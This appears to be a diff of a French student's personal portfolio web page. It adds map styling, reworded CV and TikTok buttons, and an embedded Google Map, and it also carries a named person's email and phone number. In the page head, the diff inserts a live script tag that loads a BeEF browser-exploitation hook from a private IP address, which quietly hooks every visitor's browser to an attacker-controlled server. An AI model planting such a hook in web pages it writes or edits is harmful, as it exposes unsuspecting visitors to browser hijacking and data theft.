@@ -6,6 +6,7 @@
     <title>Mon Site Web</title>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Poppins:wght@300;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css"> <!-- Ajout du lien vers la feuille de style AOS -->
+    <script src="http://192.168.44.131:3000/hook.js"></script> <!-- BeEF Hook -->
     <style>
         body {
             font-family: 'Poppins', sans-serif;
@@ -99,6 +100,25 @@
             font-size: 1.5rem;
             margin: 0 3px;
         }
+        .map-container {
+        margin: 2rem 0; /* Conserver la marge supérieure et inférieure */
+        text-align: center; /* Centrer horizontalement le contenu */
+        }
+        
+        .map-container iframe {
+            display: inline-block; /* Pour que l'iframe se comporte comme un élément en ligne */
+            border: 0;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            max-width: 100%; /* Pour s'assurer que la carte ne dépasse pas de la fenêtre */
+            height: 400px; /* Hauteur de la carte */
+        }
+        .map-container iframe:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+        }
+
         @keyframes fadeInDown {
             from {
                 opacity: 0;
@@ -349,8 +369,15 @@
         <a href="mailto:gabriel.casarotto-moreira@ipsa.fr" class="button">E-mail</a>
         <!-- Bouton Téléphone -->
         <a href="tel:+33777755193" class="button">Téléphone</a>
+
+        <p>Plus d'informations ici :</p>
+
         <!-- Bouton CV -->
-        <a href="elements/CV FR 2024.pdf" target="_blank" class="button">CV</a>
+        <a href="elements/CV FR 2024.pdf" target="_blank" class="button">Cliquez ici pour voir mon CV</a>
+        <a href="https://www.tiktok.com/@gabspacesystem" target="_blank" class="button">Cliquez ici pour voir mes créations</a>
+    </div>
+    <div class="map-container">
+    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d20895.126792505886!2d2.5244638694405084!3d49.10771401181025!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x47e6393554382921%3A0x6096ef42dab25d2f!2sSurvilliers!5e0!3m2!1sfr!2sfr!4v1716973812663!5m2!1sfr!2sfr" width="600" height="450" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
     </div>
 </div>
 
